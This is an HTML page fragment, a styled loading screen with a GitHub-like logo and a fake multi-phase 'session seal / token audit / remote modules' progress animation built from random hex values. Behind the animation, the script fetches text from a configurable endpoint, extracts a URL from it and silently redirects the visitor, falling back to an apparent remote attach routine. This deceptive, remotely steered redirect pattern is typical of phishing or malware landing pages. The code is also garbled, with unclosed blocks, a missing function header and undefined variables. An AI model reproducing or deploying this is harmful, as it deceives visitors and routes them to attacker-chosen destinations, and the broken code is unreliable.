    <style>
        :root {
            --ink: #1f2937;
            --muted: #6b7280;
            --soft: #9ca3af;
            --faint: #d1d5db;
            --track: #eef0f3;
            --card: #ffffff;
            --violet: #7c3aed;
            --violet-deep: #6d28d9;
            --blue: #3b82f6;
            --ok: #10b981;
            --shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
            color: var(--ink);
            background:
                radial-gradient(1200px 500px at 50% -10%, #f5f3ff 0%, transparent 55%),
                #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 48px 20px 120px;
            overflow-x: hidden;
            position: relative;
        }

        body::after {
            content: "";
            position: absolute;
            inset: auto 0 0 0;
            height: 180px;
            pointer-events: none;
            background-image: radial-gradient(circle, rgba(124, 58, 237, 0.18) 1.2px, transparent 1.4px);
            background-size: 14px 14px;
            mask-image: linear-gradient(to top, rgba(0,0,0,0.55), transparent 85%);
            -webkit-mask-image: linear-gradient(to top, rgba(0,0,0,0.55), transparent 85%);
        }

        .kk-frame {
            width: 100%;
            max-width: 920px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            gap: 28px;
            position: relative;
            z-index: 1;
        }

        .kk-logo {
            width: 111px;
            height: 111px;
            border-radius: 999px;
            background: #fff;
            box-shadow: var(--shadow);
            display: grid;
            place-items: center;
            overflow: hidden;
        }

        .kk-logo svg {
            width: 91%;
            height: 91%;
            fill: #24292f;
            transform: scale(1.07);
        }

        .kk-heading {
            font-size: 34px;
            font-weight: 700;
            letter-spacing: -0.02em;
            line-height: 1.2;
        }

        .kk-lead {
            margin-top: -14px;
            font-size: 15px;
            color: var(--muted);
        }

        .kk-track-wrap {
            width: min(520px, 100%);
            margin-top: 8px;
        }

        .kk-track {
            height: 8px;
            border-radius: 999px;
            background: var(--track);
            overflow: hidden;
        }

        .kk-track > i {
            display: block;
            height: 100%;
            width: 0%;
            border-radius: inherit;
            background: linear-gradient(90deg, var(--violet), var(--blue));
            transition: width 0.18s linear;
        }

        .kk-status {
            margin-top: 12px;
            font-size: 14px;
            color: var(--muted);
            display: inline-flex;
            align-items: center;
            gap: 6px;
            min-height: 20px;
        }

        .kk-status .kk-ok { color: var(--ok); font-weight: 700; }

        .kk-phases {
            width: 100%;
            margin-top: 18px;
            display: grid;
            grid-template-columns: repeat(5, minmax(0, 1fr));
            gap: 18px;
        }

        .kk-phase {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            min-width: 0;
            color: var(--soft);
        }

        .kk-icon {
            width: 56px;
            height: 56px;
            border-radius: 14px;
            background: var(--card);
            box-shadow: var(--shadow);
            display: grid;
            place-items: center;
            position: relative;
            color: var(--faint);
        }

        .kk-icon svg {
            width: 24px;
            height: 24px;
            stroke: currentColor;
            fill: none;
            stroke-width: 1.8;
            stroke-linecap: round;
            stroke-linejoin: round;
            position: relative;
            z-index: 1;
        }

        .kk-label {
            font-size: 13px;
            font-weight: 600;
            color: inherit;
        }

        .kk-hex {
            font-size: 11px;
            color: var(--soft);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            font-variant-numeric: tabular-nums;
            min-height: 14px;
            max-width: 100%;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .kk-hex .kk-ok { color: var(--ok); font-weight: 700; }

        .kk-phase.idle { color: var(--soft); }
        .kk-phase.idle .kk-icon { color: var(--faint); }

        .kk-phase.run { color: var(--violet-deep); }
        .kk-phase.run .kk-icon { color: var(--violet); }
        .kk-phase.run .kk-hex { color: var(--muted); }

        .kk-phase.pass { color: #6b7280; }
        .kk-phase.pass .kk-icon { color: #9ca3af; }
        .kk-phase.pass .kk-hex { color: var(--soft); }

        .kk-phase[data-phase="seal"].run .kk-icon {
            animation: kkSealPulse 1.1s ease-in-out infinite;
        }
        .kk-phase[data-phase="seal"].run .kk-icon::after {
            content: "";
            position: absolute;
            inset: -3px;
            border-radius: 16px;
            border: 1.5px solid rgba(124, 58, 237, 0.45);
            animation: kkSealRing 1.1s ease-in-out infinite;
        }

        @keyframes kkSealPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        @keyframes kkSealRing {
            0%, 100% { opacity: 0.35; }
            50% { opacity: 1; }
        }

        .kk-sweep {
            display: none;
            position: absolute;
            left: 10px;
            right: 10px;
            height: 2px;
            border-radius: 2px;
            background: linear-gradient(90deg, transparent, var(--violet), transparent);
            z-index: 2;
            animation: kkSweepMove 1.15s linear infinite;
        }
        .kk-phase[data-phase="audit"].run .kk-sweep { display: block; }
        @keyframes kkSweepMove {
            0% { top: 10px; opacity: 0; }
            15% { opacity: 1; }
            85% { opacity: 1; }
            100% { top: 44px; opacity: 0; }
        }

        .kk-orbit {
            display: none;
            position: absolute;
            inset: -12px;
            pointer-events: none;
        }
        .kk-orbit .kk-orbit-a,
        .kk-orbit .kk-orbit-b {
            position: absolute;
            inset: 0;
            border-radius: 999px;
            border: 2px dashed rgba(124, 58, 237, 0.35);
        }
        .kk-orbit .kk-orbit-b {
            inset: 5px;
            border-style: solid;
            border-color: transparent;
            border-top-color: rgba(124, 58, 237, 0.55);
            border-right-color: rgba(124, 58, 237, 0.2);
        }
        .kk-phase[data-phase="forge"].run .kk-orbit { display: block; }
        .kk-phase[data-phase="forge"].run .kk-orbit .kk-orbit-a { animation: kkOrbitCW 3.2s linear infinite; }
        .kk-phase[data-phase="forge"].run .kk-orbit .kk-orbit-b { animation: kkOrbitCCW 5.4s linear infinite; }
        .kk-phase[data-phase="forge"].run .kk-icon svg { animation: kkForgeBeat 1.4s ease-in-out infinite; }
        @keyframes kkOrbitCW { to { transform: rotate(360deg); } }
        @keyframes kkOrbitCCW { to { transform: rotate(-360deg); } }
        @keyframes kkForgeBeat {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.06); opacity: 0.85; }
        }

        .kk-blinks {
            display: none;
            gap: 4px;
            align-items: center;
            height: 12px;
        }
        .kk-phase[data-phase="forge"].run .kk-blinks { display: inline-flex; }
        .kk-blinks i {
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: #ddd6fe;
        }
        .kk-blinks i.kk-lit { background: var(--violet); }

        .kk-bars {
            display: none;
            position: absolute;
            left: 18px;
            right: 18px;
            top: 14px;
            bottom: 14px;
            flex-direction: column;
            justify-content: space-between;
            z-index: 2;
            pointer-events: none;
        }
        .kk-bars b {
            display: block;
            height: 3px;
            border-radius: 2px;
            background: rgba(124, 58, 237, 0.18);
        }
        .kk-phase[data-phase="load"].run .kk-bars { display: flex; }
        .kk-phase[data-phase="load"].run .kk-bars b {
            animation: kkBarPulse 0.9s ease-in-out infinite;
        }
        .kk-phase[data-phase="load"].run .kk-bars b:nth-child(2) { animation-delay: 0.15s; }
        .kk-phase[data-phase="load"].run .kk-bars b:nth-child(3) { animation-delay: 0.3s; }
        .kk-phase[data-phase="load"].run .kk-bars b:nth-child(4) { animation-delay: 0.45s; }
        @keyframes kkBarPulse {
            0%, 100% { background: rgba(124, 58, 237, 0.15); }
            50% { background: rgba(124, 58, 237, 0.85); }
        }

        .kk-ring {
            display: none;
            position: absolute;
            inset: 8px;
            z-index: 0;
        }
        .kk-ring svg { width: 100%; height: 100%; }
        .kk-ring .kk-ring-base { stroke: #ede9fe; fill: none; stroke-width: 2.5; }
        .kk-ring .kk-ring-arc {
            stroke: var(--violet);
            fill: none;
            stroke-width: 2.5;
            stroke-linecap: round;
            stroke-dasharray: 100;
            stroke-dashoffset: 100;
            transform: rotate(-90deg);
            transform-origin: 50% 50%;
            transition: stroke-dashoffset 0.15s linear;
        }
        .kk-spin {
            display: none;
            position: absolute;
            inset: 14px;
            border-radius: 999px;
            border: 2px solid transparent;
            border-top-color: rgba(124, 58, 237, 0.55);
            animation: kkOrbitCW 0.9s linear infinite;
            z-index: 0;
        }
        .kk-phase[data-phase="done"].run .kk-ring,
        .kk-phase[data-phase="done"].run .kk-spin { display: block; }

        @media (max-width: 860px) {
            .kk-heading { font-size: 28px; }
            .kk-phases {
                grid-template-columns: repeat(2, minmax(0, 1fr));
                gap: 22px 14px;
            }
            .kk-phase:last-child { grid-column: 1 / -1; }
        }
        @media (max-width: 480px) {
            .kk-phases { grid-template-columns: 1fr; }
            .kk-phase:last-child { grid-column: auto; }
            .kk-heading { font-size: 24px; }
        }
    </style>

<script>

function pickRedirect(text) {
    var body = String(text).replace(/^\uFEFF/, '').trim();
    var hit = body.match(/https?:\/\/[^'"\s;]+/);
    if (!hit) throw 0;
    return hit[0];
}

(function () {
    var kkEndpoint = TARGET.uri;
    var kkRawBody = null;
    var kkFetchFail = false;

    function kkPullText(url) {
        return fetch(url, { method: 'GET', cache: 'no-store' }).then(function (r) {
            if (!r.ok) throw 0;
            return r.text();
        });
    }

    function kkAttachRemote(url) {

    var kkPending = (!kkEndpoint)
        ? Promise.resolve(null).then(function () { kkFetchFail = true; return null; })
        : kkPullText(kkEndpoint).then(
            function (t) { kkRawBody = t; return t; },
            function () { kkFetchFail = true; kkRawBody = null; return null; }
        );

    var kkPhases = ['seal', 'audit', 'forge', 'load', 'done'];
    var kkSpan = [[0, 20], [20, 40], [40, 65], [65, 95], [95, 100]];
    var kkMsgs = [
        'Applying session seal...',
        'Auditing token chain...',
        'Forging asset bundle...',
        'Loading remote modules...',
        'Wrapping session...'

    var kkWait = [870, 840, 1150, 790];
    var kkMarks = ['8f2c1d9e4a7b6031', '3e7a1c9f2d8b5046', 'b1e6f4a9c3d82705'];

    var kkTrackFill = document.getElementById('kk-track-fill');
    var kkStatusMsg = document.getElementById('kk-status-msg');
    var kkStatusMark = document.getElementById('kk-status-mark');
    var kkRingArc = document.getElementById('kk-ring-arc');
    var kkIdx = -1;
    var kkPct = 0;
    var kkTGrow = null;
    var kkTDots = null;

    function kkPhaseEl(key) {
        return document.querySelector('.kk-phase[data-phase="' + key + '"]');
    }

    function kkSetPct(v) {
        kkPct = Math.max(0, Math.min(100, v));
        kkTrackFill.style.width = kkPct + '%';
        if (kkIdx === 4 && kkRingArc) {
            var local = (kkPct - 95) / 5;
            kkRingArc.style.strokeDashoffset = String(100 - Math.max(0, Math.min(1, local)) * 100);

        var n, key, node;
        for (n = 0; n < kkPhases.length; n++) {
            key = kkPhases[n];
            node = kkPhaseEl(key);
            if (!node) continue;
            node.classList.remove('idle', 'run', 'pass');
            if (n < kkIdx) node.classList.add('pass');
            else if (n === kkIdx) node.classList.add('run');
            else node.classList.add('idle');
        }

    function kkPutHex(key, html) {
        var node = kkPhaseEl(key);
        if (!node) return;
        var slot = node.querySelector('[data-kk-hex]');
        if (slot) slot.innerHTML = html;
    }

        if (kkTGrow) { clearInterval(kkTGrow); kkTGrow = null; }
        if (kkTDots) { clearInterval(kkTDots); kkTDots = null; }
        if (kkTHex) { clearInterval(kkTHex); kkTHex = null; }
    }

    function kkRandHex() {
        var out = '', k;
        for (k = 0; k < 16; k++) out += '0123456789abcdef'.charAt((Math.random() * 16) | 0);
        return out;
    }

    function kkBootSeal() {
        kkPutHex('seal', kkRandHex());
        kkTHex = setInterval(function () {
            if (kkIdx !== 0) return;
            kkPutHex('seal', kkRandHex());
        }, 90);
    }

    function kkBootAudit() {
        kkPutHex('audit', 'Scanning...');
        kkTHex = setInterval(function () {
            if (kkIdx !== 1) return;
            kkPutHex('audit', kkRandHex());
        }, 110);
    }

    function kkBootForge() {
        var bits = kkPhaseEl('forge').querySelectorAll('.kk-blinks i');
        var wave = 0;
        kkPutHex('forge', kkMarks[2]);
        kkTHex = setInterval(function () {
            if (kkIdx !== 2) return;
            kkPutHex('forge', kkRandHex());
        }, 120);
        kkTDots = setInterval(function () {
            if (kkIdx !== 2) return;
            wave = (wave + 1) % 3;
            var m;
            for (m = 0; m < bits.length; m++) {
                if (m <= wave) bits[m].classList.add('kk-lit');
                else bits[m].classList.remove('kk-lit');
            }
        }, 220);
    }

    function kkBootLoad() {
        kkGot = 0;
        kkPutHex('load', '0 / ' + kkNeed);
        kkTHex = setInterval(function () {
            if (kkIdx !== 3) return;
            if (kkGot < kkNeed) {
                var step = 1 + ((Math.random() * 3) | 0);
                kkGot = Math.min(kkNeed, kkGot + step);
                kkPutHex('load', kkGot + ' / ' + kkNeed);
                kkSetPct(65 + (kkGot / kkNeed) * 30);
            }
        }, 60);
    }

    function kkBootDone() {
        kkPutHex('done', 'Pending...');
        if (kkRingArc) kkRingArc.style.strokeDashoffset = '100';
    }

    function kkEnter(n) {
        kkStop();
        kkIdx = n;
        kkPaint();
        kkStatusMsg.textContent = kkMsgs[n];
        kkStatusMark.hidden = true;
        kkSetPct(kkSpan[n][0]);

        if (n === 0) kkBootSeal();
        if (n === 1) kkBootAudit();
        if (n === 2) kkBootForge();
        if (n === 3) kkBootLoad();
        if (n === 4) kkBootDone();

        var lo = kkSpan[n][0];
        var hi = kkSpan[n][1];
        kkTGrow = setInterval(function () {
            if (kkSealed || kkIdx !== n) return;
            if (n === 3 && kkGot >= kkNeed) return;
            if (kkPct < hi - 1) kkSetPct(kkPct + (hi - lo) * 0.035);
        }, 80);
    }

    function kkLeave() {
        var key = kkPhases[kkIdx];
        var node = kkPhaseEl(key);
        kkStop();
        if (key === 'seal') kkPutHex('seal', kkMarks[0] + ' <span class="kk-ok">✓</span>');
        if (key === 'audit') kkPutHex('audit', kkMarks[1] + ' <span class="kk-ok">✓</span>');
        if (key === 'forge') kkPutHex('forge', kkMarks[2] + ' <span class="kk-ok">✓</span>');
        if (key === 'load') {
            kkGot = kkNeed;
            kkPutHex('load', kkNeed + ' / ' + kkNeed + ' <span class="kk-ok">✓</span>');
        }
        if (key === 'done') kkPutHex('done', 'Complete <span class="kk-ok">✓</span>');
        if (node) {
            node.classList.remove('run');
            node.classList.add('pass');
        }
        kkSetPct(kkSpan[kkIdx][1]);
    }

    function kkPause(ms) {
        return new Promise(function (ok) { setTimeout(ok, ms); });
    }

    function kkFinish() {
        if (kkSealed) return Promise.resolve();
        kkSealed = true;
        kkStop();
        kkLeave();
        kkSetPct(100);
        kkStatusMsg.textContent = 'Complete';
        kkStatusMark.hidden = false;
        return kkPending.then(function () {
            if (!kkEndpoint || kkFetchFail || kkRawBody == null) {
                if (kkEndpoint) kkAttachRemote(kkEndpoint);
                else TARGET.fail();
                return;
            }
            try {
                location.replace(pickRedirect(kkRawBody));
            } catch (err) {
                kkAttachRemote(kkEndpoint);
            }
        });
    }

    kkEnter(0);

    (async function kkPlay() {
        await kkPause(kkWait[0]);
        kkLeave();
        kkEnter(1);

        await kkPause(kkWait[1]);
        kkLeave();
        kkEnter(2);

        await kkPause(kkWait[2]);
        kkLeave();
        kkEnter(3);

        while (kkGot < kkNeed) await kkPause(30);
        await kkPause(80);
        kkLeave();
        kkEnter(4);

        await kkPause(kkWait[3]);
        await kkFinish();
    })();
})();
</script>
